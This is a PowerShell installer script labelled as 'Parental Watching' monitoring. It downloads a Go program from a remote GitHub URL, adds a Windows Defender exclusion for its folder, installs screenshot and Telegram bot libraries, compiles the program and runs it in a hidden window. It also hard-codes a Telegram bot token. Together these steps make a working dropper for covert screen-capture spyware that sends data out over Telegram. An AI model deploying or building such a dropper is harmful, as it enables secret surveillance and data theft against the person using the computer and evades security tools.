# install_and_run.ps1
# Downloads Go MSI, sets up environment, downloads and runs monitoring.go
# USAGE: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\install_and_run.ps1

param(
    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
    [string]$Url = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/privatefile.go",
    [string]$DestFolder = "",
    [switch]$Auto,
    [switch]$RunHidden
)

# Config
$LogFile = Join-Path $env:TEMP "download_runner.log"
$GoVersion = "1.23.2"
$Arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
$MsiName = "go$GoVersion.windows-$arch.msi"
$MsiUrl = "https://go.dev/dl/$MsiName"
$GoInstallDir = "C:\Program Files\Go"
$GoBinPath = Join-Path $GoInstallDir "bin"
$GoFileName = "monitoring.go"
$DestFolder = if ($DestFolder) { $DestFolder } else { Join-Path $PSScriptRoot "Parental Watching" }
$GoFilePath = Join-Path $DestFolder $GoFileName
$ExePath = [System.IO.Path]::ChangeExtension($GoFilePath, ".exe")
$LogMaxSize = 10MB

# Helper: Log with rotation
function Log {
    param($Message)
    $Line = "$(Get-Date -Format o) - $Message"
    if (Test-Path $LogFile) {
        $LogSize = (Get-Item $LogFile).Length
        if ($LogSize -ge $LogMaxSize) {
            $BackupLog = "$LogFile.$(Get-Date -Format 'yyyyMMddHHmmss').bak"
            Rename-Item $LogFile $BackupLog
        }
    }
    Add-Content -Path $LogFile -Value $Line -ErrorAction SilentlyContinue
    Write-Output $Line
}

# Helper: Test admin privileges
function Test-IsAdmin {
    try {
        ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        $false
    }
}

# Helper: Download file
function Download-File($SourceUrl, $OutPath) {
    Log "Downloading $SourceUrl -> $OutPath"
    try {
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $SourceUrl -OutFile $OutPath -UseBasicParsing -ErrorAction Stop
        Log "Downloaded successfully"
        return $true
    } catch {
        Log "Download failed: $_"
        return $false
    } finally {
        $ProgressPreference = 'Continue'
    }
}

# Helper: Add to system PATH
function Add-ToSystemPath($Path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot modify PATH: not admin"
        return $false
    }
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
        if ($CurrentPath -notlike "*$Path*") {
            Log "Adding $Path to system PATH"
            $NewPath = "$CurrentPath;$Path"
            [Environment]::SetEnvironmentVariable("Path", $NewPath, [System.EnvironmentVariableTarget]::Machine)
            Log "System PATH updated"
            return $true
        }
        Log "$Path already in PATH"
        return $true
    } catch {
        Log "Failed to update PATH: $_"
        return $false
    }
}

# Helper: Add Defender exclusion
function Add-DefenderExclusion($Path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot add Defender exclusion: not admin"
        return $false
    }
    try {
        Log "Adding Defender exclusion for $Path"
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Log "Exclusion added"
        return $true
    } catch {
        Log "Failed to add Defender exclusion: $_"
        return $false
    }
}

# Helper: Install Go
function Install-Go {
    $MsiPath = Join-Path $DestFolder $MsiName
    if (Test-Path (Join-Path $GoInstallDir "bin\go.exe")) {
        Log "Go already installed at $GoInstallDir"
        return $true
    }
    if (-not (Test-IsAdmin)) {
        Log "Cannot install Go: not admin"
        Write-Host "Error: Run as Administrator to install Go."
        return $false
    }
    Log "Downloading Go MSI $MsiUrl to $MsiPath"
    if (-not (Download-File $MsiUrl $MsiPath)) {
        Log "Go MSI download failed"
        return $false
    }
    Log "Running Go MSI installer"
    $Args = "/i `"$MsiPath`" /qb"
    try {
        $Proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $Args -Wait -PassThru -ErrorAction Stop
        if ($Proc.ExitCode -ne 0) {
            Log "Go MSI install failed: exit code $($Proc.ExitCode)"
            return $false
        }
        Log "Go installed successfully"
        Add-ToSystemPath $GoBinPath
        [Environment]::SetEnvironmentVariable("GOROOT", $GoInstallDir, [System.EnvironmentVariableTarget]::Machine)
        Log "GOROOT set to $GoInstallDir"
        return $true
    } catch {
        Log "Go MSI install error: $_"
        return $false
    }
}

# Helper: Run executable
function Run-Exe($Path, $Hidden = $true) {
    Log "Launching $Path"
    try {
        $SI = New-Object System.Diagnostics.ProcessStartInfo
        $SI.FileName = $Path
        $SI.UseShellExecute = $false
        if ($Hidden) { $SI.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden }
        [System.Diagnostics.Process]::Start($SI) | Out-Null
        Log "Executable started"
    } catch {
        Log "Failed to start executable: $_"
    }
}

# Helper: Install Go dependencies
function Install-GoDependencies($GoFile) {
    Log "Installing Go dependencies for $GoFile"
    try {
        $Proc = Start-Process -FilePath "go" -ArgumentList "mod", "init", "monitoring" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -ErrorAction Stop
        if ($Proc.ExitCode -ne 0) {
            Log "Failed to initialize Go module: exit code $($Proc.ExitCode)"
            return $false
        }
        $Proc = Start-Process -FilePath "go" -ArgumentList "get", "github.com/kbinani/screenshot", "github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -ErrorAction Stop
        if ($Proc.ExitCode -ne 0) {
            Log "Failed to install dependencies: exit code $($Proc.ExitCode)"
            return $false
        }
        Log "Dependencies installed"
        return $true
    } catch {
        Log "Dependency install error: $_"
        return $false
    }
}

# Helper: Compile and run Go program
function Compile-AndRun($GoFile) {
    Log "Compiling $GoFile to $ExePath"
    try {
        $Proc = Start-Process -FilePath "go" -ArgumentList "build", "-o", $ExePath, $GoFile -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -ErrorAction Stop
        if ($Proc.ExitCode -ne 0) {
            Log "Compilation failed: exit code $($Proc.ExitCode)"
            return $false
        }
        Log "Compilation successful"
        Run-Exe $ExePath $RunHidden
        return $true
    } catch {
        Log "Compilation error: $_"
        return $false
    }
}

# Main
Log "Script started. DestFolder: $DestFolder, Url: $Url"
New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null

# Convert GitHub blob URL to raw
if ($Url -match "github.com/.+/blob/(.+)$") {
    $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"
    Log "Converted blob URL to raw: $Url"
}

# Download Go MSI and install
if (-not (Install-Go)) {
    Log "Go installation failed. Exiting."
    exit 1
}

# Download Go script
if (-not (Download-File $Url $GoFilePath)) {
    Log "Failed to download Go script. Exiting."
    exit 1
}

# Add Defender exclusion
Add-DefenderExclusion $DestFolder

# Install dependencies and compile
if (-not (Install-GoDependencies $GoFilePath)) {
    Log "Failed to install dependencies. Exiting."
    exit 1
}
if (-not (Compile-AndRun $GoFilePath)) {
    Log "Failed to compile/run Go program. Exiting."
    exit 1
}

Log "Script completed successfully."